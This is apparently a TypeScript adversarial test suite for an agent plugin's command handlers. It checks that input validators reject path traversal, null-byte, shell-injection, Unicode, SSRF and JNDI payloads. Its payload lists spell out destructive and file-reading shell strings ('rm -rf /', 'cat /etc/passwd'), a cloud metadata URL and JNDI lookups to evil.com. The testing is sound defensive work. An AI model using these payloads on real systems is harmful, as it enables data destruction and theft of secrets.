/**
 * Adversarial Security Tests for Command Adapters (Task 5.10)
 *
 * ATTACK VECTORS COVERED:
 * 1. Path Traversal - attempts to escape .swarm directory via command args
 * 2. Null Byte Injection - injecting null bytes to truncate paths/strings
 * 3. Control Character Injection - injecting control chars (0x00-0x1F)
 * 4. Command Injection - shell metacharacters in args
 * 5. Argument Pollution - malformed, oversized, special character args
 * 6. Flag Injection - malicious flag values and combinations
 * 7. Unicode Attacks - unicode normalization/replacement attacks
 * 8. Edge Cases - empty, extremely long, boundary values
 */

import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { sanitizeTaskId } from '../evidence/manager';
import { validateSwarmPath } from '../hooks/utils';
import { sanitizeSummaryId } from '../summaries/manager';
import { handleArchiveCommand } from './archive';
import { handleBenchmarkCommand } from './benchmark';
import { isCommandFailure } from './registry';

const text = (r: Awaited<ReturnType<typeof handleBenchmarkCommand>>): string =>
	isCommandFailure(r) ? r.text : r;

import { handleDoctorCommand } from './doctor';
import { handleEvidenceCommand } from './evidence';
import { handleResetCommand } from './reset';
import { handleRetrieveCommand } from './retrieve';
import { handleSyncPlanCommand } from './sync-plan';

// ============================================================================
// TEST UTILITIES
// ============================================================================

function createTempDir(): string {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'security-test-'));
	return dir;
}

function cleanupDir(dir: string): void {
	if (fs.existsSync(dir)) {
		fs.rmSync(dir, { recursive: true, force: true });
	}
}

function createSwarmDir(dir: string): string {
	const swarmDir = path.join(dir, '.swarm');
	fs.mkdirSync(swarmDir, { recursive: true });
	return swarmDir;
}

function createTestConfig(dir: string, config: object): void {
	const configDir = path.join(dir, '.opencode');
	fs.mkdirSync(configDir, { recursive: true });
	const configPath = path.join(configDir, 'opencode-swarm.json');
	fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

// ============================================================================
// ATTACK VECTOR PAYLOADS
// ============================================================================

// Path traversal payloads with literal ".." that MUST be blocked
// Note: Only .. followed by / or \ is dangerous; ..; is just a literal filename
const PATH_TRAVERSAL_PAYLOADS = [
	'../etc/passwd',
	'..\\..\\..\\windows\\system32',
	'....//....//etc/passwd', // Contains .. followed by /
	'../../../proc/self/environ',
	'..\\..\\..\\..\\..\\..\\etc\\passwd',
	'/../../etc/passwd',
	'\\..\\..\\etc\\passwd',
	'evidence/../../../etc/passwd',
	'summaries/../../../etc/passwd',
];

// URL-encoded payloads - treated as literal strings (not decoded)
// This is safe because they don't contain literal ".." after path normalization
const URL_ENCODED_PAYLOADS = [
	'..%2f..%2f..%2fetc%2fpasswd',
	'..%252f..%252fetc%2fpasswd',
	'..%c0%af..%c0%afetc/passwd',
];

const NULL_BYTE_PAYLOADS = [
	'file\x00.txt',
	'S1\x00.json',
	'task\x00id',
	'S\x001',
	'../../etc/passwd\x00.jpg',
	'test\x00\x00\x00',
	'\x00S1',
	'S1\x00',
	'evidence\x00.json',
];

const CONTROL_CHAR_PAYLOADS = [
	'\x01S1', // SOH
	'\x02S1', // STX
	'\x03S1', // ETX
	'\x08S1', // Backspace
	'\x0bS1', // Vertical tab
	'\x0cS1', // Form feed
	'\x1bS1', // Escape
	'\x1fS1', // US
	'S1\x0a', // Newline
	'S1\x0d', // Carriage return
	'S1\t', // Tab
	'S1\x09extra', // Tab with extra
];

const COMMAND_INJECTION_PAYLOADS = [
	'; rm -rf /',
	'| rm -rf /',
	'|| rm -rf /',
	'&& rm -rf /',
	'$(rm -rf /)',
	'`rm -rf /`',
	'> /etc/passwd',
	'>> /etc/passwd',
	'< /etc/passwd',
	'; cat /etc/passwd #',
	'| cat /etc/passwd',
	'$(cat /etc/passwd)',
	'`cat /etc/passwd`',
	'; id;',
	'| id |',
	'& whoami',
	'1; DROP TABLE users--',
	"1'; DROP TABLE users--",
	'1 OR 1=1',
	"' OR '1'='1",
	'" OR "1"="1',
];

const SPECIAL_CHAR_PAYLOADS = [
	'!@#$%^&*()',
	'[]{}|\\',
	'"\'`~',
	'<>?,./',
	'=',
	'+',
	'-',
	'@#$',
	'§±',
	'¿¡',
];

const UNICODE_PAYLOADS = [
	'\u202e', // Right-to-left override
	'\u202d', // Left-to-right override
	'\u200b', // Zero-width space
	'\u200c', // Zero-width non-joiner
	'\u200d', // Zero-width joiner
	'\u00ad', // Soft hyphen
	'\u0000', // Null (NUL)
	'\ufeff', // BOM
	'\uffff', // Max BMP
	'\uD800\uDC00', // Surrogate pair
	'\u00e9', // Latin small letter e with acute
	'\u4e2d\u6587', // Chinese
	'\u0627\u0644\u0639\u0631\u0628\u064a\u0629', // Arabic
	'\u0420\u0443\u0441\u0441\u043a\u0438\u0439', // Russian
	'𐍈', // Old Italic (4-byte UTF-8)
	'🔥', // Emoji
	'👨‍👩‍👧‍👦', // Family emoji (ZWJ sequence)
];

// ============================================================================
// SECURITY TESTS
// ============================================================================

describe('Command Adapters - Adversarial Security Tests', () => {
	let tempDir: string;

	beforeEach(() => {
		tempDir = createTempDir();
	});

	afterEach(() => {
		cleanupDir(tempDir);
	});

	// =========================================================================
	// PATH TRAVERSAL ATTACKS
	// =========================================================================

	describe('Path Traversal Attacks', () => {
		describe('validateSwarmPath', () => {
			it('should reject all path traversal payloads with literal ..', () => {
				for (const payload of PATH_TRAVERSAL_PAYLOADS) {
					expect(() => validateSwarmPath(tempDir, payload)).toThrow(
						/path traversal|path escapes/,
					);
				}
			});

			it('should reject path traversal with null bytes', () => {
				expect(() => validateSwarmPath(tempDir, '..\\..\x00')).toThrow(
					/null bytes/,
				);
				expect(() => validateSwarmPath(tempDir, '../\x00etc/passwd')).toThrow(
					/null bytes/,
				);
			});

			it('should reject absolute paths that escape .swarm', () => {
				expect(() => validateSwarmPath(tempDir, '/etc/passwd')).toThrow(
					/path escapes/,
				);
				expect(() =>
					validateSwarmPath(tempDir, 'C:\\Windows\\System32'),
				).toThrow(/path escapes/);
			});

			it('should reject paths that resolve outside .swarm', () => {
				expect(() => validateSwarmPath(tempDir, '../../etc/passwd')).toThrow(
					/path traversal|path escapes/,
				);
				expect(() => validateSwarmPath(tempDir, '../../../tmp')).toThrow(
					/path traversal|path escapes/,
				);
			});

			it('should handle URL-encoded payloads safely (treats as literal)', () => {
				// URL-encoded strings are NOT decoded - treated as literal filenames
				// This is safe because they don't contain literal ".."
				for (const payload of URL_ENCODED_PAYLOADS) {
					try {
						const result = validateSwarmPath(tempDir, payload);
						// If it doesn't throw, verify it stays within .swarm
						expect(result).toContain('.swarm');
					} catch (e) {
						// Throwing is also acceptable
						expect(e).toBeInstanceOf(Error);
					}
				}
			});
		});

		describe('sanitizeTaskId', () => {
			it('should reject path traversal patterns in task IDs', () => {
				for (const payload of PATH_TRAVERSAL_PAYLOADS) {
					expect(() => sanitizeTaskId(payload)).toThrow(/Invalid task ID/);
				}
			});

			it('should reject dot sequences', () => {
				expect(() => sanitizeTaskId('..')).toThrow();
				expect(() => sanitizeTaskId('...')).toThrow();
				expect(() => sanitizeTaskId('task../id')).toThrow();
			});
		});

		describe('sanitizeSummaryId', () => {
			it('should reject path traversal patterns in summary IDs', () => {
				for (const payload of PATH_TRAVERSAL_PAYLOADS) {
					expect(() => sanitizeSummaryId(payload)).toThrow(
						/Invalid summary ID/,
					);
				}
			});
		});

		describe('Command handlers - path traversal resistance', () => {
			it('handleResetCommand should resist path traversal', async () => {
				// Reset uses validateSwarmPath internally
				const result = await handleResetCommand(tempDir, ['--confirm']);
				expect(result).not.toContain('Error');
				expect(result).toContain('Swarm Reset');
			});

			it('handleRetrieveCommand should reject path traversal safely', async () => {
				for (const payload of PATH_TRAVERSAL_PAYLOADS.slice(0, 5)) {
					const result = await handleRetrieveCommand(tempDir, [payload]);
					// Should reject with error message, not leak files
					expect(result).toContain('Invalid summary ID');
					expect(text(result)).not.toContain('root:'); // No leaked /etc/passwd content
				}
			});

			it('handleEvidenceCommand should reject path traversal safely', async () => {
				for (const payload of PATH_TRAVERSAL_PAYLOADS.slice(0, 3)) {
					try {
						const result = await handleEvidenceCommand(tempDir, [payload]);
						// Should handle gracefully - either no evidence or error message
						expect(typeof result).toBe('string');
					} catch (e) {
						// Throwing error is also acceptable
						expect(e).toBeInstanceOf(Error);
					}
				}
			});
		});
	});

	// =========================================================================
	// NULL BYTE INJECTION
	// =========================================================================

	describe('Null Byte Injection', () => {
		describe('validateSwarmPath', () => {
			it('should reject null bytes in filenames', () => {
				for (const payload of NULL_BYTE_PAYLOADS) {
					expect(() => validateSwarmPath(tempDir, payload)).toThrow(
						/null bytes/,
					);
				}
			});
		});

		describe('sanitizeTaskId', () => {
			it('should reject null bytes in task IDs', () => {
				for (const payload of NULL_BYTE_PAYLOADS) {
					expect(() => sanitizeTaskId(payload)).toThrow(/null bytes/);
				}
			});
		});

		describe('sanitizeSummaryId', () => {
			it('should reject null bytes in summary IDs', () => {
				for (const payload of NULL_BYTE_PAYLOADS) {
					expect(() => sanitizeSummaryId(payload)).toThrow(/null bytes/);
				}
			});
		});

		describe('Command handlers - null byte resistance', () => {
			it('handleRetrieveCommand should reject null bytes safely', async () => {
				for (const payload of NULL_BYTE_PAYLOADS) {
					try {
						const result = await handleRetrieveCommand(tempDir, [payload]);
						expect(result).not.toContain('[object');
						expect(typeof result).toBe('string');
					} catch (e) {
						expect(e).toBeInstanceOf(Error);
					}
				}
			});

			it('handleEvidenceCommand should reject null bytes safely', async () => {
				for (const payload of NULL_BYTE_PAYLOADS.slice(0, 3)) {
					try {
						const result = await handleEvidenceCommand(tempDir, [payload]);
						expect(typeof result).toBe('string');
					} catch (e) {
						expect(e).toBeInstanceOf(Error);
					}
				}
			});
		});
	});

	// =========================================================================
	// CONTROL CHARACTER INJECTION
	// =========================================================================

	describe('Control Character Injection', () => {
		describe('sanitizeTaskId', () => {
			it('should reject control characters (0x00-0x1F)', () => {
				for (const payload of CONTROL_CHAR_PAYLOADS) {
					expect(() => sanitizeTaskId(payload)).toThrow(/control characters/);
				}
			});

			it('should reject each control character individually', () => {
				for (let i = 0; i < 32; i++) {
					const char = String.fromCharCode(i);
					// Tab, newline, carriage return are control chars too
					expect(() => sanitizeTaskId(`S1${char}`)).toThrow();
				}
			});
		});

		describe('sanitizeSummaryId', () => {
			it('should reject control characters', () => {
				for (const payload of CONTROL_CHAR_PAYLOADS) {
					expect(() => sanitizeSummaryId(payload)).toThrow(
						/control characters/,
					);
				}
			});
		});

		describe('Command handlers - control char resistance', () => {
			it('handleRetrieveCommand should reject control chars safely', async () => {
				for (const payload of CONTROL_CHAR_PAYLOADS.slice(0, 5)) {
					try {
						const result = await handleRetrieveCommand(tempDir, [payload]);
						expect(typeof result).toBe('string');
						expect(result).not.toContain('[object');
					} catch (e) {
						expect(e).toBeInstanceOf(Error);
					}
				}
			});
		});
	});

	// =========================================================================
	// COMMAND INJECTION
	// =========================================================================

	describe('Command Injection Attacks', () => {
		describe('handleDoctorCommand - injection resistance', () => {
			it('should safely handle shell metacharacters in args', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				for (const payload of COMMAND_INJECTION_PAYLOADS) {
					const result = await handleDoctorCommand(tempDir, [payload]);
					expect(result).toContain('## Config Doctor Report');
					// Should not execute the injection
					expect(result).not.toContain('uid=');
					expect(result).not.toContain('root');
				}
			});

			it('should handle injection in --fix flag context', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				const result = await handleDoctorCommand(tempDir, [
					'--fix',
					'; rm -rf /',
				]);
				expect(result).toContain('## Config Doctor Report');
			});
		});

		describe('handleArchiveCommand - injection resistance', () => {
			it('should safely handle shell metacharacters', async () => {
				createTestConfig(tempDir, { evidence: { max_age_days: 30 } });

				for (const payload of COMMAND_INJECTION_PAYLOADS.slice(0, 5)) {
					const result = await handleArchiveCommand(tempDir, [
						payload,
						'--dry-run',
					]);
					expect(typeof result).toBe('string');
				}
			});
		});

		describe('handleBenchmarkCommand - injection resistance', () => {
			it('should safely handle shell metacharacters in flags', async () => {
				for (const payload of COMMAND_INJECTION_PAYLOADS.slice(0, 5)) {
					const result = await handleBenchmarkCommand(tempDir, [payload]);
					expect(result).toContain('## Swarm Benchmark');
				}
			});
		});

		describe('handleResetCommand - injection resistance', () => {
			it('should safely handle shell metacharacters', async () => {
				createSwarmDir(tempDir);

				for (const payload of COMMAND_INJECTION_PAYLOADS.slice(0, 5)) {
					const result = await handleResetCommand(tempDir, [
						payload,
						'--confirm',
					]);
					expect(result).toContain('Swarm Reset');
				}
			});
		});
	});

	// =========================================================================
	// ARGUMENT POLLUTION
	// =========================================================================

	describe('Argument Pollution', () => {
		describe('Empty and undefined arguments', () => {
			it('handleRetrieveCommand should handle empty args', async () => {
				const result = await handleRetrieveCommand(tempDir, []);
				expect(result).toContain('Usage');
			});

			it('handleRetrieveCommand should handle undefined arg', async () => {
				const result = await handleRetrieveCommand(tempDir, [
					undefined as unknown as string,
				]);
				expect(typeof result).toBe('string');
			});

			it('handleEvidenceCommand should handle empty args (list mode)', async () => {
				const result = await handleEvidenceCommand(tempDir, []);
				expect(result).toContain('evidence');
			});

			it('handleDoctorCommand should handle empty args array', async () => {
				const result = await handleDoctorCommand(tempDir, []);
				expect(result).toContain('## Config Doctor Report');
			});
		});

		describe('Extremely long arguments', () => {
			const longString = 'A'.repeat(10000);
			const _veryLongString = 'B'.repeat(100000);

			it('handleRetrieveCommand should handle long IDs without crash', async () => {
				const result = await handleRetrieveCommand(tempDir, [longString]);
				expect(typeof result).toBe('string');
			});

			it('handleEvidenceCommand should handle long task IDs', async () => {
				const result = await handleEvidenceCommand(tempDir, [longString]);
				expect(typeof result).toBe('string');
			});

			it('handleDoctorCommand should handle long args', async () => {
				const result = await handleDoctorCommand(tempDir, [longString]);
				expect(result).toContain('## Config Doctor Report');
			});

			it('handleResetCommand should handle long args', async () => {
				const result = await handleResetCommand(tempDir, [
					'--confirm',
					longString,
				]);
				expect(result).toContain('Swarm Reset');
			});

			it('sanitizeTaskId should handle long strings appropriately', () => {
				// Should either accept (if valid pattern) or reject
				expect(() => sanitizeTaskId('a'.repeat(1000))).not.toThrow(); // Valid
				expect(() => sanitizeTaskId('!'.repeat(1000))).toThrow(); // Invalid
			});
		});

		describe('Array prototype pollution resistance', () => {
			it('should not be affected by array prototype pollution', async () => {
				// Attempt prototype pollution
				const originalIncludes = Array.prototype.includes;

				try {
					// @ts-expect-error - Testing prototype pollution
					Array.prototype.evil = () => 'pwned';

					const result = await handleDoctorCommand(tempDir, ['--fix']);
					expect(result).not.toContain('pwned');
				} finally {
					// @ts-expect-error - Cleanup
					delete Array.prototype.evil;
					Array.prototype.includes = originalIncludes;
				}
			});
		});
	});

	// =========================================================================
	// FLAG INJECTION
	// =========================================================================

	describe('Flag Injection', () => {
		describe('handleDoctorCommand - flag handling', () => {
			it('should handle --fix flag correctly', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				const result = await handleDoctorCommand(tempDir, ['--fix']);
				expect(result).toContain('## Config Doctor Report');
			});

			it('should handle -f shorthand', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				const result = await handleDoctorCommand(tempDir, ['-f']);
				expect(result).toContain('## Config Doctor Report');
			});

			it('should handle combined flags safely', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				const result = await handleDoctorCommand(tempDir, [
					'--fix',
					'--verbose',
					'--unknown',
				]);
				expect(result).toContain('## Config Doctor Report');
			});

			it('should handle fake flags safely', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				const result = await handleDoctorCommand(tempDir, [
					'--fix=../../../etc/passwd',
				]);
				expect(result).not.toContain('root:');
			});
		});

		describe('handleArchiveCommand - flag handling', () => {
			it('should handle --dry-run flag correctly', async () => {
				createTestConfig(tempDir, { evidence: { max_age_days: 30 } });

				const result = await handleArchiveCommand(tempDir, ['--dry-run']);
				expect(typeof result).toBe('string');
			});

			it('should handle malformed flags safely', async () => {
				createTestConfig(tempDir, { evidence: { max_age_days: 30 } });

				const result = await handleArchiveCommand(tempDir, [
					'--dry-run=../../../etc/passwd',
				]);
				expect(result).not.toContain('root:');
			});
		});

		describe('handleBenchmarkCommand - flag handling', () => {
			it('should handle --cumulative flag', async () => {
				const result = await handleBenchmarkCommand(tempDir, ['--cumulative']);
				expect(result).toContain('cumulative');
			});

			it('should handle --ci-gate flag', async () => {
				const result = await handleBenchmarkCommand(tempDir, ['--ci-gate']);
				expect(text(result)).toContain('CI Gate');
			});

			it('should handle flag injection attempts', async () => {
				const result = await handleBenchmarkCommand(tempDir, [
					'--ci-gate',
					'--unknown=../../../etc/passwd',
				]);
				expect(text(result)).not.toContain('root:');
			});
		});

		describe('handleResetCommand - flag handling', () => {
			it('should require --confirm flag', async () => {
				const result = await handleResetCommand(tempDir, []);
				expect(result).toContain('confirm');
				expect(result).not.toContain('Complete');
			});

			it('should handle --confirm flag correctly', async () => {
				createSwarmDir(tempDir);

				const result = await handleResetCommand(tempDir, ['--confirm']);
				expect(result).toContain('Swarm Reset Complete');
			});

			it('should handle -c shorthand safely', async () => {
				const result = await handleResetCommand(tempDir, ['-c']);
				// Should not interpret -c as confirm
				expect(result).toContain('confirm');
			});
		});
	});

	// =========================================================================
	// UNICODE ATTACKS
	// =========================================================================

	describe('Unicode Attacks', () => {
		describe('sanitizeTaskId - unicode handling', () => {
			it('should reject unicode chars that dont match the regex', () => {
				// The regex ^[\w-]+(\.[\w-]+)*$ only accepts ASCII word chars
				expect(() => sanitizeTaskId('任务-1')).toThrow(); // Chinese
				expect(() => sanitizeTaskId('task-🔥')).toThrow(); // Emoji
			});

			it('should reject dangerous unicode chars', () => {
				// Zero-width chars should be rejected by regex
				expect(() => sanitizeTaskId('S1\u200b')).toThrow(); // Zero-width space
			});

			it('should handle RTL override safely', () => {
				expect(() => sanitizeTaskId('\u202eS1')).toThrow();
			});

			it('should accept valid ASCII task IDs', () => {
				expect(() => sanitizeTaskId('task-1')).not.toThrow();
				expect(() => sanitizeTaskId('my_task')).not.toThrow();
				expect(() => sanitizeTaskId('Task123')).not.toThrow();
				expect(() => sanitizeTaskId('1.0.0')).not.toThrow();
			});
		});

		describe('sanitizeSummaryId - unicode handling', () => {
			it('should only accept ASCII alphanumeric', () => {
				// Summary IDs must be S followed by digits only
				expect(() => sanitizeSummaryId('S1')).not.toThrow();
				expect(() => sanitizeSummaryId('S123')).not.toThrow();
				expect(() => sanitizeSummaryId('S\u00e91')).toThrow(); // S with accent
				expect(() => sanitizeSummaryId('S🔥1')).toThrow();
			});
		});

		describe('Command handlers - unicode resistance', () => {
			it('handleRetrieveCommand should handle unicode safely', async () => {
				for (const payload of UNICODE_PAYLOADS) {
					try {
						const result = await handleRetrieveCommand(tempDir, [payload]);
						expect(typeof result).toBe('string');
						// Should not crash or leak memory
					} catch (e) {
						expect(e).toBeInstanceOf(Error);
					}
				}
			});

			it('handleEvidenceCommand should handle unicode safely', async () => {
				for (const payload of UNICODE_PAYLOADS.slice(0, 5)) {
					try {
						const result = await handleEvidenceCommand(tempDir, [payload]);
						expect(typeof result).toBe('string');
					} catch (e) {
						expect(e).toBeInstanceOf(Error);
					}
				}
			});

			it('handleDoctorCommand should handle unicode args safely', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				for (const payload of UNICODE_PAYLOADS.slice(0, 5)) {
					const result = await handleDoctorCommand(tempDir, [payload]);
					expect(result).toContain('## Config Doctor Report');
				}
			});
		});
	});

	// =========================================================================
	// SPECIAL CHARACTERS
	// =========================================================================

	describe('Special Character Handling', () => {
		describe('Command handlers - special chars', () => {
			it('handleRetrieveCommand should handle special chars safely', async () => {
				for (const payload of SPECIAL_CHAR_PAYLOADS) {
					const result = await handleRetrieveCommand(tempDir, [payload]);
					expect(typeof result).toBe('string');
				}
			});

			it('handleDoctorCommand should handle special chars in args', async () => {
				createTestConfig(tempDir, { max_iterations: 5 });

				for (const payload of SPECIAL_CHAR_PAYLOADS) {
					const result = await handleDoctorCommand(tempDir, [payload]);
					expect(result).toContain('## Config Doctor Report');
				}
			});

			it('handleBenchmarkCommand should handle special chars', async () => {
				for (const payload of SPECIAL_CHAR_PAYLOADS.slice(0, 5)) {
					const result = await handleBenchmarkCommand(tempDir, [payload]);
					expect(result).toContain('## Swarm Benchmark');
				}
			});
		});
	});

	// =========================================================================
	// EDGE CASES
	// =========================================================================

	describe('Edge Cases', () => {
		describe('Whitespace handling', () => {
			it('should handle whitespace-only args', async () => {
				const result = await handleRetrieveCommand(tempDir, ['   ']);
				expect(typeof result).toBe('string');
			});

			it('should handle tabs in args', async () => {
				const result = await handleRetrieveCommand(tempDir, ['\t\t']);
				expect(typeof result).toBe('string');
			});

			it('should handle newlines in args', async () => {
				const result = await handleRetrieveCommand(tempDir, ['\n\r\n']);
				expect(typeof result).toBe('string');
			});
		});

		describe('Number edge cases', () => {
			it('should handle numeric-looking strings', async () => {
				expect(() => sanitizeSummaryId('S0')).not.toThrow();
				expect(() => sanitizeSummaryId('S999999999999')).not.toThrow();
				expect(() => sanitizeSummaryId('S-1')).toThrow();
				expect(() => sanitizeSummaryId('S1.5')).toThrow();
			});

			it('should handle scientific notation attempts', async () => {
				expect(() => sanitizeSummaryId('S1e10')).toThrow();
				expect(() => sanitizeSummaryId('S1E10')).toThrow();
			});
		});

		describe('Empty directory handling', () => {
			it('handleSyncPlanCommand should handle empty directory', async () => {
				const result = await handleSyncPlanCommand(tempDir, []);
				expect(result).toContain('No active swarm plan');
			});

			it('handleArchiveCommand should handle empty evidence', async () => {
				createTestConfig(tempDir, { evidence: { max_age_days: 30 } });
				const result = await handleArchiveCommand(tempDir, []);
				expect(result).toContain('No evidence');
			});
		});

		describe('Missing config handling', () => {
			it('handleDoctorCommand should handle missing config', async () => {
				const result = await handleDoctorCommand(tempDir, []);
				expect(result).toContain('## Config Doctor Report');
			});

			it('handleArchiveCommand should use defaults without config', async () => {
				const result = await handleArchiveCommand(tempDir, ['--dry-run']);
				expect(typeof result).toBe('string');
			});
		});

		describe('Concurrent access simulation', () => {
			it('should handle multiple rapid calls', async () => {
				const promises = [];
				for (let i = 0; i < 10; i++) {
					promises.push(handleDoctorCommand(tempDir, ['--fix']));
				}
				const results = await Promise.all(promises);
				for (const result of results) {
					expect(result).toContain('## Config Doctor Report');
				}
			});
		});

		describe('Invalid directory handling', () => {
			it('handleDoctorCommand should handle invalid directory path', async () => {
				const result = await handleDoctorCommand('/nonexistent', []);
				expect(typeof result).toBe('string');
			});

			it('handleSyncPlanCommand should handle invalid directory', async () => {
				const result = await handleSyncPlanCommand('', []);
				expect(result).toContain('## Plan Sync Report');
			});
		});
	});

	// =========================================================================
	// INPUT VALIDATION BOUNDARY TESTS
	// =========================================================================

	describe('Input Validation Boundaries', () => {
		describe('Summary ID validation', () => {
			it('should accept valid summary IDs', () => {
				expect(() => sanitizeSummaryId('S1')).not.toThrow();
				expect(() => sanitizeSummaryId('S99')).not.toThrow();
				expect(() => sanitizeSummaryId('S999999')).not.toThrow();
			});

			it('should reject invalid summary ID formats', () => {
				expect(() => sanitizeSummaryId('s1')).toThrow(); // lowercase
				expect(() => sanitizeSummaryId('S')).toThrow(); // no digits
				expect(() => sanitizeSummaryId('1S')).toThrow(); // wrong order
				expect(() => sanitizeSummaryId('S1a')).toThrow(); // letters after
				expect(() => sanitizeSummaryId('S_1')).toThrow(); // underscore
				expect(() => sanitizeSummaryId('S-1')).toThrow(); // hyphen
				expect(() => sanitizeSummaryId(' S1')).toThrow(); // leading space
				expect(() => sanitizeSummaryId('S1 ')).toThrow(); // trailing space
			});

			it('should reject empty string', () => {
				expect(() => sanitizeSummaryId('')).toThrow(/empty/);
			});
		});

		describe('Task ID validation', () => {
			it('should accept valid task IDs', () => {
				expect(() => sanitizeTaskId('task-1')).not.toThrow();
				expect(() => sanitizeTaskId('my_task')).not.toThrow();
				expect(() => sanitizeTaskId('Task123')).not.toThrow();
				expect(() => sanitizeTaskId('1.0.0')).not.toThrow();
				expect(() => sanitizeTaskId('a')).not.toThrow();
			});

			it('should reject invalid task IDs', () => {
				expect(() => sanitizeTaskId('')).toThrow(/empty/);
				expect(() => sanitizeTaskId('task/../../etc')).toThrow();
				expect(() => sanitizeTaskId('task name')).toThrow(); // space
				expect(() => sanitizeTaskId('task#1')).toThrow(); // hash
			});
		});

		describe('Path validation', () => {
			it('should accept valid filenames', () => {
				expect(() => validateSwarmPath(tempDir, 'plan.json')).not.toThrow();
				expect(() =>
					validateSwarmPath(tempDir, 'evidence/task-1/evidence.json'),
				).not.toThrow();
				expect(() =>
					validateSwarmPath(tempDir, 'summaries/S1.json'),
				).not.toThrow();
			});

			it('should reject paths with null bytes', () => {
				expect(() => validateSwarmPath(tempDir, '\x00')).toThrow();
			});

			it('should reject paths that escape .swarm', () => {
				expect(() => validateSwarmPath(tempDir, '../etc/passwd')).toThrow();
			});
		});
	});

	// =========================================================================
	// REGRESSION TESTS - KNOWN ATTACK PATTERNS
	// =========================================================================

	describe('Known Attack Pattern Regression Tests', () => {
		it('should not be vulnerable to CVE-2021-44228 style attacks', async () => {
			const jndiPayloads = [
				'$' + '{jndi:ldap://evil.com/a}',
				'$' +
					'{' +
					'$' +
					'{lower:j}' +
					'$' +
					'{lower:n}' +
					'$' +
					'{lower:d}' +
					'$' +
					'{lower:i}' +
					':' +
					'$' +
					'{lower:l}' +
					'$' +
					'{lower:d}' +
					'$' +
					'{lower:a}' +
					'$' +
					'{lower:p}' +
					'://evil.com/a' +
					'}',
			];

			for (const payload of jndiPayloads) {
				const result = await handleDoctorCommand(tempDir, [payload]);
				expect(result).not.toContain('evil.com');
			}
		});

		it('should not be vulnerable to prototype pollution via __proto__', async () => {
			const result = await handleDoctorCommand(tempDir, [
				'__proto__',
				'constructor',
			]);
			expect(result).toContain('## Config Doctor Report');
		});

		it('should handle ReDoS attempt patterns', async () => {
			// Patterns that could cause catastrophic backtracking
			const redosPayloads = [
				`${'a'.repeat(100)}!`,
				`${'('.repeat(50)}a${')'.repeat(50)}`,
			];

			for (const payload of redosPayloads) {
				// These should complete quickly
				const start = Date.now();
				await handleRetrieveCommand(tempDir, [payload]);
				const elapsed = Date.now() - start;
				expect(elapsed).toBeLessThan(5000); // 5 second max
			}
		});

		it('should handle SSRF-like patterns safely', async () => {
			const ssrfPayloads = [
				'file:///etc/passwd',
				'http://169.254.169.254/latest/meta-data/',
				'gopher://localhost:11211/_stats',
			];

			for (const payload of ssrfPayloads) {
				const result = await handleRetrieveCommand(tempDir, [payload]);
				// Should reject with error, not actually fetch
				expect(result).toContain('Invalid summary ID');
				// No actual file/network content leaked
				expect(result).not.toMatch(/^(root:|{)/);
			}
		});
	});
});
